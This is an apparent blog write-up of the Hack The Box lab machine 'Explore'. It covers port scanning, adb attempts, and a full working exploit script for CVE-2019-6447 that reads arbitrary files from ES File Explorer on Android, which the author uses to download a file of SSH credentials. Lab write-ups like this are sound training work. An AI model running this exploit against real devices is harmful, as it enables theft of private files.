---
title: "Explore"
author: "Me"
date: "July 14, 2021"
output: html_document
---

# Explore

 <div id="boxinfo">
 <div id="textbox">
 <p class="alignleft">**Difficulty**: easy (?/10)</p>
 <p class="aligncenter">**Type**: CTF</p>
 <p class="alignright">**OS**: Android</p>
 </div>
 <div style="clear: both;"></div>
 </div> 

<div class="img_container">
![desc]({{https://jsom1.github.io/}}/_images/htb_explore_desc.png){: height="415px" width = 625px"}
</div>

**Ports/services exploited:** \\
**Tools:** \\
**Techniques:** \\
**Keywords:**  


## 1. Port scanning
{:style="color:DarkRed; font-size: 170%;"}

Let's start by adding the box' IP to our hosts file with the following command:

````
echo "10.10.10.247 explore.htb" >> /etc/hosts
`````

Then, we'll use *nmap* to detect what ports and services are running on the machine. 
As usual, we specify the flags *-sV* to have a verbose output, *-O* to enable OS detection, and *-sC* to enable the most common scripts scan:

<div class="img_container">
![nmap]({{https://jsom1.github.io/}}/_images/htb_explore_nmap.png)
</div>

There's not much going there, only ssh on port 2222 (it's usually on port 22) and freeciv on port 5555, which appears to be a video game. 
We will therefore look for ssh 2.0, Banana Studio and freeciv vulnerabilities.

## 2. Find and exploit vulnerabilities
{:style="color:DarkRed; font-size: 170%;"}

Most of the time, there is a web server running on HtB machines. It's not the case here, so we start by Googling and searching for potential exploits on Metasploit. While we search, we can launch a full TCP scan in the background:

<div class="img_container">
![FULL tcp scan]({{https://jsom1.github.io/}}/_images/htb_explore_full.png)
</div>

We see two more opened ports with unknown services. I just browsed to those ports to see if it could be a web server, but it wasn't the case. We can try to get more information about those services by initiating a telnet or netcat session with the following syntax:

````
sudo telnet explore.htb 36199
`````

Once connected, we can issue a command. Obviously this will not work since telnet is usually running on port 23, but sometimes the server responds with an error message that includes more information about the service. It is not the case for any of the two services here.\\
Let's leave them aside for now and go back at port 5000. After a few Google searches, I found an interesting article (https://medium.com/@samsepio1/android4-vulnhub-writeup-3036f352640f). Apparently, this port is also used by **adb** (Android Debug Bridge). It's a tool that allows one to connect to an android device remotely and is generally used for developement. So why is it written freeciv? It appears that sometimes *nmap* indicates freeciv is running, whereas it is *adb* (there's an opened issue for that on nmap's github repo). In our case we don't know which service it is, but we can give *adb* a try. Following the article, we might be able to connect to the machine and get a shell.

We start by installing *adb* (warning: taking a snapshot before executing the next command is recommanded. I didn't and it pretty much broke my kali machine. After installation it restarted and I had no more GUI. I had to reinstall *xfce* and even after that my machine was altered):

````
sudo apt-get install adb
`````

We can then try to connect to it:

<div class="img_container">
![adb]({{https://jsom1.github.io/}}/_images/htb_explore_adb.png)
</div>

We see the daemon wasn't running and is being started on port 5037. I then tried to connect to it (*sudo adb connect explore.htb:5037*) but nothing happens and the connection times out... There's a command to list the connected devices:

````
adb devices
`````

<div class="img_container">
![adb devices]({{https://jsom1.github.io/}}/_images/htb_explore_dev.png)
</div>

We see the previous discovered port, but it is offline. This might be helpful later though. This seems to be a dead end for now. Let's start from fresh with nmap:

<div class="img_container">
![nmap2]({{https://jsom1.github.io/}}/_images/htb_explore_nmap2.png)
</div>

Surpinsingly, nmap discovers two new ports this time, among which we see a web server... I don't know why it didn't find them on the first scan. Let's search for more information about *ES File Explorer* and *Bukkit JSONAPI*. We quickly find an exploit on *exploit-db* for *ES File Explorer*:

````
# Exploit Title: ES File Explorer 4.1.9.7.4 - Arbitrary File Read
# Date: 29/06/2021
# Exploit Author: Nehal Zaman
# Version: ES File Explorer v4.1.9.7.4
# Tested on: Android
# CVE : CVE-2019-6447

import requests
import json
import ast
import sys

if len(sys.argv) < 3:
    print(f"USAGE {sys.argv[0]} <command> <IP> [file to download]")
    sys.exit(1)

url = 'http://' + sys.argv[2] + ':59777'
cmd = sys.argv[1]
cmds = ['listFiles','listPics','listVideos','listAudios','listApps','listAppsSystem','listAppsPhone','listAppsSdcard','listAppsAll','getFile','getDeviceInfo']
listCmds = cmds[:9]
if cmd not in cmds:
    print("[-] WRONG COMMAND!")
    print("Available commands : ")
    print("  listFiles         : List all Files.")
    print("  listPics          : List all Pictures.")
    print("  listVideos        : List all videos.")
    print("  listAudios        : List all audios.")
    print("  listApps          : List Applications installed.")
    print("  listAppsSystem    : List System apps.")
    print("  listAppsPhone     : List Communication related apps.")
    print("  listAppsSdcard    : List apps on the SDCard.")
    print("  listAppsAll       : List all Application.")
    print("  getFile           : Download a file.")
    print("  getDeviceInfo     : Get device info.")
    sys.exit(1)

print("\n==================================================================")
print("|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |")
print("|                Coded By : Nehal a.k.a PwnerSec                 |")
print("==================================================================\n")

header = {"Content-Type" : "application/json"}
proxy = {"http":"http://127.0.0.1:8080", "https":"https://127.0.0.1:8080"}

def httpPost(cmd):
    data = json.dumps({"command":cmd})
    response = requests.post(url, headers=header, data=data)
    return ast.literal_eval(response.text)

def parse(text, keys):
    for dic in text:
        for key in keys:
            print(f"{key} : {dic[key]}")
        print('')

def do_listing(cmd):
    response = httpPost(cmd)
    if len(response) == 0:
        keys = []
    else:
        keys = list(response[0].keys())
    parse(response, keys)

if cmd in listCmds:
    do_listing(cmd)

elif cmd == cmds[9]:
    if len(sys.argv) != 4:
        print("[+] Include file name to download.")
        sys.exit(1)
    elif sys.argv[3][0] != '/':
        print("[-] You need to provide full path of the file.")
        sys.exit(1)
    else:
        path = sys.argv[3]
        print("[+] Downloading file...")
        response = requests.get(url + path)
        with open('out.dat','wb') as wf:
            wf.write(response.content)
        print("[+] Done. Saved as `out.dat`.")

elif cmd == cmds[10]:
    response = httpPost(cmd)
    keys = list(response.keys())
    for key in keys:
        print(f"{key} : {response[key]}")
``````

With this exploit, we should be able to read files on the server. On *exploit-db*, we click on *View raw*, copy the url and curl it from Kali as follows:

````
sudo curl https://www.exploit-db.com/raw/50070 -o esfile.py
`````

And we can try it with the given syntax in the exploit:

<div class="img_container">
![exploit]({{https://jsom1.github.io/}}/_images/htb_explore_png.png)
</div>

There's a file called *creds.jpg* that we can download with the exploit's *getFile* function:

````
sudo python3 esfile.py getFile 10.10.10.247/storage/emulated/0/DCIM/creds.jpg
`````

The file is downloaded on our machine and we can simply open it to discover its content:

<div class="img_container">
![creds]({{https://jsom1.github.io/}}/_images/htb_explore_creds.png)
</div>

And we have the username *kristi* with the the password *Kr1sT!5h@Rp3xPl0r3!*. Before trying those credentials with SSH, let's have a look at the other available resources.



<ins>**My thoughts**</ins>
 
First Android box, cool that it doesn't start with a web serv.
